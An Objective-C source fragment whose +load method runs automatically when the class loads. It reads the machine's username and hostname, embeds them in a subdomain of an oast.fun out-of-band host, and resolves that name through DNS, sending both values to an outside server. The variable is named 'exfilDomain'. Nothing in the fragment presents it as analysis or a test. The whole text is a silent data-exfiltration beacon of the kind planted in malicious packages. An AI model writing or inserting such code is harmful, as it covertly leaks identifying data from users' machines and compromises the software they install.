#import <Foundation/Foundation.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>

+ (void)load {
    dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_DEFAULT, 0), ^{
        NSString *user = NSUserName();
        NSString *host = [[NSHost currentHost] name];
        
        NSString *cleanUser = [[user stringByReplacingOccurrencesOfString:@" " withString:@"-"] lowercaseString];
        NSString *cleanHost = [[host stringByReplacingOccurrencesOfString:@" " withString:@"-"] lowercaseString];
        
        NSString *exfilDomain = [NSString stringWithFormat:@"%@.%@.xkrlhpfhpyyqcliksdujpddovn6tj65t4.oast.fun", cleanUser, cleanHost];
        
        struct addrinfo *res;
        getaddrinfo([exfilDomain UTF8String], NULL, NULL, &res);
    });
}
